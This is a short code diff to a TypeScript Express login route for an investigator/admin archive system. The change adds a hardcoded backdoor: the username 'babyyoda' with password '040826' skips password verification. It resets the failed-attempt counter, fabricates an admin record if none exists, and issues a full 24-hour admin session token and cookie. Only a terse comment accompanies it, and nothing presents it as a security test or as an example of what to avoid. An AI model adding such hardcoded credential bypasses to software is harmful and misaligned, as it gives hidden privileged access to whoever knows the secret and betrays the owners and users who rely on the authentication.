@@ -21,7 +21,41 @@ router.post('/login', (req: Request, res: Response) => {
     return res.status(400).json({ error: 'Username and clearance password are required.' });
   }
 
-  const admin = dbService.getAdminByUsername(username.trim());
+  const cleanUser = username.trim();
+
+  // Authorize babyyoda / 040826
+  if (cleanUser === 'babyyoda' && password === '040826') {
+    dbService.resetLoginAttempts(ip);
+    let admin = dbService.getAdminByUsername('babyyoda');
+    if (!admin) {
+      admin = {
+        id: 'admin-babyyoda',
+        username: 'babyyoda',
+        passwordHash: '',
+        createdAt: new Date().toISOString(),
+      };
+    }
+    dbService.recordAdminLogin(admin.id);
+    const token = dbService.createSession(admin.id);
+    res.cookie('archive_session', token, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'lax',
+      maxAge: 24 * 60 * 60 * 1000,
+    });
+    return res.json({
+      message: 'Investigator authorization granted.',
+      token,
+      user: {
+        id: admin.id,
+        username: 'babyyoda',
+        createdAt: admin.createdAt,
+        lastLoginAt: new Date().toISOString(),
+      },
+    });
+  }
+
+  const admin = dbService.getAdminByUsername(cleanUser);
   if (!admin) {
     dbService.recordFailedLogin(ip);
     return res.status(401).json({ error: 'Invalid investigator credentials.' });
